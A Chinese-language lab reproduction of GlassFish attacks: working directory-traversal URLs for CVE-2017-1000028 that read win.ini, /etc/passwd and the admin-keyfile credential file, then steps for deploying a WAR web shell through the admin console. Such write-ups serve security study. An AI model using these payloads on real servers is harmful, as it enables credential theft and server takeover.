## **GlassFish简介**

 **默认端口：**

    
    
    使用Admin的端口 4848
    使用HTTP Instance的端口 8080
    使用HTTP_SSL的端口 8181
    使用IIOP_SSL的端口 3820
    

## **GlassFish Directory Traversal（CVE-2017-1000028）**

###  **漏洞简介：**

    
    
    Java语言中会把 %c0%af解析为\uC0AF，最后转义为ASCII字符的/。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。
    

### **影响范围：**

低于4.1.2版本（包含4.1.2版本）

###  **复现操作：**

访问

    
    
    http://192.168.109.161:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
    

![image-20210514004508583.png](https://image.3001.net/images/20210514/1620969336_609e0778d97486c3884bf.png!small)读取到admin-keyfile文件，该文件是储存admin账号密码的文件。目录路径在：

    
    
    glassfish/domains/domain1/config/admin-keyfile
    

访问  
![image-20210514010456571.png](https://image.3001.net/images/20210514/1620969350_609e0786d2f31ba2037f3.png!small)

    
    
    http://192.168.109.161:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains\domain1\config\admin-keyfile
    

linux系统同理：

    
    
    http://192.168.109.147:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
    

如果不能成功读取，自行添加 ..%c0%af 即可。

###  **GlassFish后台getshell**

访问登陆页面报错

![image-20210514120447339.png](https://image.3001.net/images/20210514/1620969369_609e07999c77d09f06bc0.png!small)glassfish4以下版本都会遇到该类问题，需修改glassfish的默认admin密码  
![image-20210514120646857.png](https://image.3001.net/images/20210514/1620969379_609e07a39f61e69c5d441.png!small)设置安全机制  
![image-20210514120818084.png](https://image.3001.net/images/20210514/1620969387_609e07ab71c87dded4f0d.png!small)弹出安全机制认证，接着正常登陆即可。  
![image-20210514121222132.png](https://image.3001.net/images/20210514/1620969396_609e07b4ebb8dd5f82949.png!small)成功登陆访问。

###  **复现操作：**

点击左侧Applications，接着点击deploy  
![image-20210514121411513.png](https://image.3001.net/images/20210514/1620969405_609e07bde579c3256f78b.png!small)上传war包，填写Context
Root到访问的url，点击OK  
![image-20210514123007228.png](https://image.3001.net/images/20210514/1620969414_609e07c61babf2c9206d3.png!small)![image-20210514123021519.png](https://image.3001.net/images/20210514/1620969423_609e07cf4c7a0c89a6224.png!small)上传成功。

如果报错 A full JDK (not just JRE) is required,是由于目前使用的解析为JRE，需要调成JDK解析。  
![image-20210514123916821.png](https://image.3001.net/images/20210514/1620969433_609e07d98acce00d646c7.png!small)

    
    
    set "server.java-config.java-home=C:\Program Files\Java\jdk1.7.0_80"
    

测试war包木马部署情况

    
    
    http://127.0.0.1:8080/[Context Root]/[war包内的filename]
    

![image-20210514130309701.png](https://image.3001.net/images/20210514/1620969446_609e07e698a537dd97bc6.png!small)部署成功！

